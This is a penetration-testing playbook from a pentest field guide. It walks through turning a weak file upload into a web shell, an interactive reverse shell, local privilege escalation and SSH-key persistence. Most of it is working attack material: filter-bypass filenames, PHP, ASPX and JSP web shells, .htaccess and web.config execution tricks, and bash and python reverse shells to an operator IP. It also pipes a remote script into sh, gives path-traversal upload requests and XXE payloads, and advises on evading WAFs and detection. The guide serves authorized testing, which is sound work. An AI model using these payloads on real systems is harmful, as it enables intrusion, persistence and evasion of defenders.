---
tags:
  - hack-notes
  - playbook
  - web
---

# File Upload to Web Shell to Foothold Playbook

> An unrestricted or weakly filtered file upload is fingerprinted, the validation is defeated, a minimal web shell is planted in a web-accessible path, upgraded to an interactive reverse shell, and a foothold is consolidated via local privilege escalation.

> **Attack graph position**
> **Fed by:** Entry point (a reachable web app).
> **Feeds into:** [Blind SSRF to Cloud Metadata RCE](Blind%20SSRF%20to%20Cloud%20Metadata%20RCE.md) (server-side file parser). End state: web-tier foothold.
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance
| | |
|---|---|
| Goal | Turn a file upload into code execution and a stable interactive foothold on the web server |
| Starting position | Unauthenticated or low-priv access to an app with an upload feature (avatar, attachment, import, document, media) |
| End state | Interactive shell as the web user, then a consolidated foothold (often root/SYSTEM after local privesc) |
| Key techniques | T1190 Exploit Public-Facing App, T1505.003 Web Shell, T1059 Command and Scripting Interpreter, T1068 Exploitation for Privilege Escalation |
| Prerequisites | An upload sink that lands files where they can be reached and executed, OR a parser that can be turned into RCE/SSRF/XXE |
| Difficulty | Low (no server-side checks) to High (random names, no-exec dir, WAF, S3 storage) |
| Noise level | Moderate to Loud (new file in webroot, web user spawning a shell, and the callback are all high-signal) |

## Attack Path
```
Find upload feature
   |
   v
Fingerprint: allowed types? where does it land? web-accessible? server tech (PHP/ASP.NET/Java)?
   |
   +--- web-accessible exec path? ---NO---> DECISION BRANCH (parser attacks)
   |                                          - SVG/PDF/DOCX -> SSRF / XXE / ImageMagick RCE
   |  YES                                     - SVG/HTML rendered inline -> stored XSS
   v                                          - deserialization-on-parse
Defeat validation
   (ext allow/deny bypass | double ext | content-type spoof | magic-byte/polyglot
    | null byte (legacy) | case/trailing tricks | .htaccess / web.config AddType)
   |
   v
Plant minimal web shell (matched to stack: .php / .phtml / .aspx / .jsp)
   |
   v
Confirm exec  ->  upgrade to interactive reverse shell  ->  TTY
   |
   v
Situational awareness  ->  local privilege escalation  ->  consolidate foothold
   |
   +--- path traversal in filename? ---> write OUTSIDE upload dir (cron, webroot, authorized_keys)
```

## Prerequisites and Setup
- A reachable upload feature. Look beyond the obvious avatar: ticket attachments, CSV/XML/ZIP import, profile photo, resume/CV, document preview, "report a problem", theme/plugin install, WYSIWYG image paste, API multipart endpoints.
- Operator tooling:
  - Burp Suite (Repeater for hand-crafting multipart, Intruder for fuzzing extensions/content-types).
  - `curl` for scripted uploads.
  - `exiftool` and `printf`/`xxd` for forging magic bytes and polyglots.
  - `weevely` (PHP shell generator + client) and the [Web App and Payloads](../Cheatsheets/Web%20App%20and%20Payloads.md) shell snippets.
  - A listener: `nc -lvnp 443`, or `pwncat-cs -lp 443`, or a Metasploit `multi/handler`.
  - `wfuzz`/`ffuf` to brute the storage path if the file lands somewhere non-obvious.
- A known callback IP/port reachable from the target (egress 443/53/80 first).
- Decide OPSEC up front: a web shell in the webroot is a durable IOC. Plan to delete it the moment you have a stable reverse shell, and never leave `.htaccess`/`web.config` behind.

## Walkthrough

### Step 1. Fingerprint the upload and the server
What and why: before any bypass, learn the four facts that decide the whole chain. (1) What does the filter allow, (2) where does the file physically land, (3) is that path web-accessible and will it execute server-side, (4) what is the stack (PHP / ASP.NET / Java / Node). Guessing here wastes the upload.

Identify the stack from headers and behavior.
```bash
# server tech and framework fingerprint
curl -sI https://victim.target/ | grep -iE 'server|x-powered-by|x-aspnet|set-cookie'
# PHPSESSID -> PHP; ASP.NET_SessionId / .aspx -> IIS/.NET; JSESSIONID -> Java/Tomcat
whatweb https://victim.target/
```

Do a clean baseline upload of an allowed file, then find where it landed.
```bash
# upload a benign image, watch the response for a returned URL/path
curl -s -F 'file=@cat.jpg' https://victim.target/upload \
  -H 'Cookie: SESSION=...' -i | grep -iE 'location|/uploads/|"url"|"path"'
# common landing dirs to probe if the response hides it:
for p in /uploads /files /media /img /avatars /tmp /assets/uploads; do
  curl -s -o /dev/null -w "%{http_code} $p/cat.jpg\n" "https://victim.target$p/cat.jpg"
done
```

Success signal: you can retrieve your benign file at a predictable URL, and a request for that URL returns it (200) rather than forcing a download. Note whether the returned filename is kept verbatim (good) or randomized/rehashed (harder, see Troubleshooting).

Decision / branch: if the file is stored but NOT web-accessible or executable (served from S3/CDN, behind a download handler, or saved with a random name and no exec mapping), do not burn time on a shell. Jump to **Variations and Pivots -> Parser and content attacks** for SSRF/XXE/XSS/deserialization routes.

### Step 2. Map the validation by probing one control at a time
What and why: change one variable per request so you learn which control is enforced. Test extension handling, MIME/content-type handling, magic-byte handling, and whether the path is execution-mapped, independently.

```bash
# A) raw forbidden extension - is it server-side blocked at all?
curl -s -F 'file=@shell.php' https://victim.target/upload -H 'Cookie: SESSION=...'
# B) allowed extension but PHP content - does it inspect content?
cp shell.php shell.jpg && curl -s -F 'file=@shell.jpg' ...
# C) forbidden ext + spoofed Content-Type (craft in Burp Repeater):
#    Content-Disposition: form-data; name="file"; filename="shell.php"
#    Content-Type: image/jpeg
```

Success signal: the server's rejection messages tell you the control. "Invalid extension" = name/ext check. "Invalid file type" with a valid ext = content/MIME check. Silent accept of `shell.jpg` containing PHP = no content inspection, you only need the right extension to execute.

### Step 3. Defeat the validation
What and why: pick the bypass that matches the control you found in Step 2. Work down this list; the first that lands an executable file wins.

**Extension allow/deny-list bypasses (PHP).** Deny-lists rarely cover every executable handler. Try the alternates that Apache/PHP still execute:
```
shell.phtml   shell.phar   shell.php3   shell.php4   shell.php5
shell.php7    shell.php8    shell.pht    shell.pgif   shell.inc
# ASP.NET: .aspx .asp .ashx .asmx .cer .asax .config(below) .soap
# JSP:     .jsp .jspx .jspf .jsw .jsv .jtml
```

**Double extension.** Works when the app validates the last segment but the server maps an earlier one, or when an Apache `AddHandler` mistakenly matches `.php` anywhere in the name:
```
shell.php.jpg     shell.jpg.php     shell.php%00.jpg     shell.php;.jpg
```

**Case and trailing tricks.** Defeat case-sensitive deny-lists and naive trims:
```
shell.PhP   shell.pHP   shell.php.    shell.php%20   shell.php%0a
shell.php::$DATA   (Windows/IIS NTFS ADS, strips the suffix and writes shell.php)
shell.php.....   (Windows trims trailing dots/spaces)
```

**Content-Type spoof.** If only the multipart `Content-Type` header is checked, send `image/jpeg` (or `image/png`) while the filename and body stay PHP. Edit in Burp so the body is untouched.

**Magic-byte / polyglot.** If the server sniffs file content (e.g. `getimagesize`, `finfo`), prepend a valid image signature so the file passes as an image but still parses as PHP when executed:
```bash
# GIF polyglot: valid GIF header + PHP payload, named to execute
printf 'GIF89a;\n<?php system($_GET["c"]); ?>\n' > shell.gif.php
# or inject PHP into a real JPEG's comment, then rename/double-ext to execute
exiftool -Comment='<?php system($_GET["c"]); ?>' cat.jpg -o shell.jpg
mv shell.jpg shell.phtml   # or use the .htaccess trick below to exec .jpg
# verify the magic bytes survived
xxd shell.gif.php | head -1   # 4749 4638 39... = GIF89
```

**Null byte (legacy).** Only on old stacks (PHP < 5.3.4, some Java/CGI). The string terminates at `%00`, so the validator sees `.jpg` but the filesystem writes `.php`:
```
filename="shell.php%00.jpg"
```

**.htaccess AddType trick (Apache, when PHP names are blocked but `.htaccess` upload is allowed).** Stop fighting the deny-list. Upload an `.htaccess` that maps a benign-looking extension to the PHP handler, then upload your shell with that extension. References: [PayloadsAllTheThings Apache .htaccess](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/).
```apache
# .htaccess  (upload this first, into the same upload dir)
AddType application/x-httpd-php .rce
# then upload  shell.rce  containing  <?php system($_GET['c']); ?>
```
A magic-byte-safe variant prepends a GIF header so the `.htaccess` itself passes content sniffing, while still being parsed line by line by Apache:
```apache
#define width 1337
#define height 1337
AddType application/x-httpd-php .rce
php_flag engine 1
```

**web.config AddType trick (IIS).** The IIS equivalent. Drop a `web.config` in the upload dir that registers an ASP/handler mapping or runs inline classic ASP. Then call `web.config` itself (it is served and executed) or your mapped file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="rce" path="*.rce" verb="*"
           modules="IsapiModule"
           scriptProcessor="C:\Windows\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="None"/>
    </handlers>
  </system.webServer>
</configuration>
<%@ Language="VBScript" %>
<% Response.Write(CreateObject("WScript.Shell").Exec("whoami").StdOut.ReadAll()) %>
```

Success signal: a request to the planted file returns command output (next step) instead of raw source or a download.

### Step 4. Plant a minimal web shell matched to the stack
What and why: keep the shell tiny and single-purpose. A one-liner is harder to flag than a feature-rich shell and easier to clean. Pick the language the server executes.

PHP:
```php
<?php system($_GET['c']); ?>
```
ASP.NET (.aspx):
```aspx
<%@ Page Language="C#" %><% System.Diagnostics.Process p =
  System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe",
  "/c " + Request["c"]){RedirectStandardOutput=true,UseShellExecute=false});
  Response.Write(p.StandardOutput.ReadToEnd()); %>
```
JSP:
```jsp
<%@ page import="java.util.*,java.io.*" %><%
  Process p = Runtime.getRuntime().exec(request.getParameter("c"));
  BufferedReader d = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l; while((l=d.readLine())!=null){ out.println(l); } %>
```

Call it and confirm execution:
```bash
curl -s 'https://victim.target/uploads/shell.phtml?c=id'
# success: uid=33(www-data) gid=33(www-data) ...   (or "nt authority\..." on IIS)
```

Success signal: the response body is the output of `id`/`whoami`. You now have unauthenticated RCE as the web user.

Decision / branch: if exec functions are disabled (blank output, or a `disable_functions` warning), see Troubleshooting -> disable_functions. If you want a managed shell instead of a raw one-liner, deploy `weevely`:
```bash
weevely generate S3cret /tmp/agent.php   # obfuscated PHP agent
# upload agent.php (apply the bypasses above), then:
weevely 'https://victim.target/uploads/agent.php' S3cret
```

### Step 5. Upgrade to an interactive reverse shell
What and why: a GET-per-command web shell is fragile and loud per request. Use the RCE once to call back to a listener, then work in a real shell.

Start a listener on the operator box, then trigger the callback through the web shell. Full payload set and the TTY upgrade are in [Reverse Shells and File Transfer](../Cheatsheets/Reverse%20Shells%20and%20File%20Transfer.md).
```bash
# operator
nc -lvnp 443        # or: pwncat-cs -lp 443

# trigger via the web shell (URL-encode the payload)
# Linux:
curl -s 'https://victim.target/uploads/shell.phtml' \
  --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"' -G
# fallback if bash redirection is blocked:
curl -sG 'https://victim.target/uploads/shell.phtml' \
  --data-urlencode 'c=python3 -c '\''import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'\'''
# Windows/IIS: use a PowerShell or nc.exe callback (see the cheatsheet)
```
Stabilize the TTY once connected:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm
```

Success signal: an interactive prompt as `www-data` (or the app pool / service account) on your listener.

### Step 6. Situational awareness and local privilege escalation
What and why: the web user is rarely the end state. Enumerate fast, find one privesc primitive, and consolidate so you survive the web shell being deleted (you will delete it for OPSEC).

```bash
# quick Linux triage (full enum and escalation paths -> the cheatsheet)
id; hostname; sudo -n -l 2>/dev/null
uname -a; getcap -r / 2>/dev/null
find / -perm -4000 -type f 2>/dev/null         # SUID
crontab -l; ls -la /etc/cron.* /etc/cron.d 2>/dev/null
# pull and run an enumeration helper from your http server
curl -s http://10.10.14.5:8000/linpeas.sh | sh
```
Pick a path and escalate. Linux options and exact commands are in [Linux Privilege Escalation](../Cheatsheets/Linux%20Privilege%20Escalation.md) (SUID GTFOBins, writable cron, sudo misconfig, capabilities, kernel/PwnKit). On Windows IIS, app-pool service accounts frequently hold `SeImpersonatePrivilege`: confirm with `whoami /priv` and use a Potato (e.g. GodPotato/PrintSpoofer) per [Windows Privilege Escalation](../Cheatsheets/Windows%20Privilege%20Escalation.md).

Consolidate the foothold so it does not depend on the shell file:
```bash
# Linux: add a key for a real user you control or root (if writable)
mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAA... operator' >> ~/.ssh/authorized_keys
# or establish a tunnel/agent per the Pivoting cheatsheet, then remove the web shell
```

Success signal: you hold a session that survives deletion of the uploaded shell (SSH key, service account ticket, or a tunnel/implant), and ideally root/SYSTEM.

### Step 7. Path-traversal-in-filename variant (write outside the upload dir)
What and why: if the app preserves the filename and joins it to a base path without normalizing, a `../` in the filename writes your file anywhere the web user can write. This is the route when the upload dir is non-exec but you can reach the webroot, a cron path, or `authorized_keys`.

Craft the multipart by hand so the path lands in `filename`. Try both raw and encoded traversal, including the IIS/Windows backslash form:
```http
POST /upload HTTP/1.1
Host: victim.target
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/s.phtml"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
--X--
```
```
# encoding variants if the literal ../ is stripped:
..%2f..%2fvar%2fwww%2fhtml%2fs.phtml
..%252f..%252f...            (double URL-encode)
....//....//                 (defeats a single non-recursive strip)
..\..\..\inetpub\wwwroot\s.aspx     (Windows/IIS)
```
High-value write targets: `/var/www/html/` (webroot, then call the shell), `/etc/cron.d/x` (Linux scheduled exec), `~/.ssh/authorized_keys`, `C:\inetpub\wwwroot\`.

Success signal: the file appears at the traversed location (request it back, or check it from the Step 5 shell) and executes there.

## OPSEC and Detection
- New file in webroot is the loudest signal. File integrity monitoring (FIM), web-root diffing, and tools like Wazuh/auditd flag a fresh `.php`/`.aspx`/`.jsp` with a recent mtime in an uploads directory. Keep the shell tiny, delete it immediately after Step 5, and prefer landing it under an existing uploads folder rather than the document root.
- WAF upload rules (ModSecurity CRS, cloud WAFs) inspect multipart bodies for `<?php`, `eval(`, `system(`, `base64_decode`, shell metacharacters, and known web-shell signatures, and they block double extensions and `.htaccess`/`web.config` filenames. Encode/obfuscate the payload, split it, or use the polyglot so the body reads as an image. See Troubleshooting -> WAF.
- Web-shell behavior is detectable even when the file is hidden: requests with command output in the response, a single endpoint receiving odd `?c=`/`?cmd=` parameters, and POST bodies that look like code. Backdoor scanners (NeoPI, Loki, the YARA web-shell rules, IIS/Apache module scanners) hunt these.
- Anomalous process ancestry is the highest-fidelity catch: `www-data`/`apache`/`w3wp.exe` spawning `bash`, `sh`, `cmd.exe`, `powershell.exe`, `python`, `nc`, or `whoami`. EDR alerts on `httpd -> sh -> curl`. Minimize commands run directly under the web user; pivot to a non-web account or a key-based session quickly.
- Egress callback is logged by netflow/proxy. Prefer 443; avoid odd high ports outbound where possible.
- `.htaccess`/`web.config` creation in an uploads dir is itself a strong IOC and changes server behavior for that directory. Treat it as temporary and remove it.

## Cleanup
- Delete every uploaded shell and helper, by exact path: `rm -f /var/www/html/uploads/shell.phtml /tmp/agent.php` (and any traversal-written copies). On IIS, `del C:\inetpub\wwwroot\uploads\shell.aspx`.
- Remove any `.htaccess` or `web.config` you planted in the upload directory so the directory's execution behavior returns to baseline.
- Remove path-traversal artifacts written outside the upload dir (cron files in `/etc/cron.d/`, any `authorized_keys` line you added that you no longer need, webroot copies).
- Tear down persistence you no longer need: added SSH keys, created users, scheduled tasks/cron, any implant. Keep only what the engagement scope authorizes and document it.
- Note exact timestamps and paths of every artifact created so the blue team (or your report) can verify full removal.
- Stop your listener and HTTP file server; remove staged tools (`linpeas.sh`, `nc.exe`) you dropped on the host.

## Troubleshooting
- **Upload accepted but file not web-accessible.** It is likely on S3/CDN or behind a download handler, or in a non-served data dir. Confirm by fetching it. If genuinely unreachable, switch to the parser/content attacks in Variations (the file's *content* still gets parsed somewhere).
- **Randomized filename.** The server rehashes the name, so you cannot guess the URL. Look for the name in the upload response/JSON, in a "my files" listing, in EXIF/metadata echoed back, or in predictable hash inputs (timestamp + original name). If truly unguessable and unreferenced, pivot to parser attacks or path traversal (which lets you choose the name).
- **No-exec upload directory.** The dir is mapped non-executable (e.g. `php_admin_flag engine off`, or static-only handler). Use the path-traversal variant (Step 7) to write into an executable location, or the `.htaccess`/`web.config` trick to re-enable execution for that directory if config upload is allowed.
- **exec disabled (`disable_functions`).** `system/exec/shell_exec/passthru/popen/proc_open` are blocked. Try alternates first (`mail()` + `putenv("LD_PRELOAD=...")` with a built `.so`, automated by Tarlogic's Chankro). If `dl()`/FFI is available, load a module. If all command sinks are dead, you still have a file-read/write primitive via PHP streams: read config/secrets, write to cron/webroot. Reference: [Tarlogic disable_functions bypass](https://www.tarlogic.com/blog/disable_functions-bypasses-php-exploitation/).
- **WAF blocks the upload.** Defeat content signatures with the GIF polyglot (body reads as an image), obfuscate the PHP (`$_GET[0]($_GET[1])`, base64/gzip-wrapped eval), split the payload across fields, change `Content-Type`, or vary the boundary and casing. If the filename `.htaccess`/`web.config`/`.php` is blocked outright, use an alternate exec extension (`.phtml`, `.phar`) or the traversal write.
- **Magic-byte check rejects the polyglot.** Use a fuller, valid header (real GIF/PNG/JPEG) and place the payload in a comment field so `getimagesize()`/`finfo` validates the image but the interpreter still runs the embedded code, then ensure the file is reached through an executable extension.
- **Callback never lands.** Egress is filtered. Try 443/53/80 in turn, a DNS or ICMP channel, or stay on the web shell and tunnel out (chisel/ligolo) per [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md).

## Variations and Pivots
- **Parser and content attacks (the Step 1 NO branch).** When you cannot execute the file but the server *parses* it, weaponize the content:
  - **SVG -> stored XSS** when the image is rendered inline (not as a download or in an `<img>`). Files served inline execute script; `<img>` parses without script context; download attachments do not execute.
    ```xml
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
    ```
  - **SVG/XML -> XXE and SSRF** when the upload is parsed by an XML reader. Read local files or reach internal services:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
    ```
    DOCX/XLSX (OOXML), SVG, and many "image" pipelines are XML under the hood; SSRF to `http://169.254.169.254/` chains into [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md).
  - **ImageMagick / Ghostscript RCE** when an image is processed server-side. ImageMagick delegates PostScript/EPS/PDF/SVG to Ghostscript by default. CVE-2024-29510 (Ghostscript format-string, `-dSAFER` bypass, EPS disguised as JPG) and CVE-2026-25797 (ImageMagick PostScript/HTML coder injection) both reach RCE through an upload. Probe by uploading a crafted SVG/EPS/PDF and watching for command execution or a callback. References: [Software Secured Ghostscript RCE](https://www.softwaresecured.com/post/imagemagick-rce-take-2), [SentinelOne CVE-2026-25797](https://www.sentinelone.com/vulnerability-database/cve-2026-25797/).
  - **Deserialization-on-parse.** If the upload is unpickled (Python), unserialized (PHP `unserialize`/phar), or read by a Java object stream, a crafted file is direct RCE. A `.phar` upload that is later `include`/`file_exists`'d triggers PHP object instantiation even without a `.php` extension.
- **Content-Disposition abuse.** If the download handler reflects an uploaded filename into the `Content-Disposition` header without sanitizing, inject CRLF or a fake `filename=` to confuse browsers or chain header injection.
- **Escalation from the foothold.** Once you are the web user with a stable session, walk [Linux Privilege Escalation](../Cheatsheets/Linux%20Privilege%20Escalation.md) or [Windows Privilege Escalation](../Cheatsheets/Windows%20Privilege%20Escalation.md) to root/SYSTEM, then pivot internally per [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md). If the app also has a database sink, compare against [SQL Injection to RCE to Pivot](SQL%20Injection%20to%20RCE%20to%20Pivot.md) for an alternate RCE route.

## Related
- Checklist: [Web Application](../Checklists/Web%20Application.md)
- Cheatsheets: [Web App and Payloads](../Cheatsheets/Web%20App%20and%20Payloads.md), [Reverse Shells and File Transfer](../Cheatsheets/Reverse%20Shells%20and%20File%20Transfer.md), [Linux Privilege Escalation](../Cheatsheets/Linux%20Privilege%20Escalation.md), [Windows Privilege Escalation](../Cheatsheets/Windows%20Privilege%20Escalation.md), [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md)
- Sibling playbooks: [SQL Injection to RCE to Pivot](SQL%20Injection%20to%20RCE%20to%20Pivot.md), [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md)

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
